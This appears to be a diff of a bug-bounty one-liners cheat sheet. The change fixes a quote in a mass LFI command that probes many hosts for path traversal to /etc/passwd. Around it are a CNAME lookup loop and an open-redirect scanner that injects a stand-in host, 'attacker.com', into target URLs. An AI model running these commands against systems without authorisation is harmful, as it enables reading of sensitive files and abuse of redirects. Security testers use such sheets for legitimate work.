@@ -35,7 +35,7 @@ order: 3
 + ``cat live-domains.txt | while read domains;do dig $domains;done | grep CNAME``
 
 ### Mass LFI
-+ ``cat hosts | httpx -path ///////../../../etc/passwd -mc 200 -match-string 'root:x:``
++ ``cat hosts | httpx -path ///////../../../etc/passwd -mc 200 -match-string 'root:x:'``
 
 ### Open Redirect
 + ``export LHOST="attacker.com"; gau target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'``
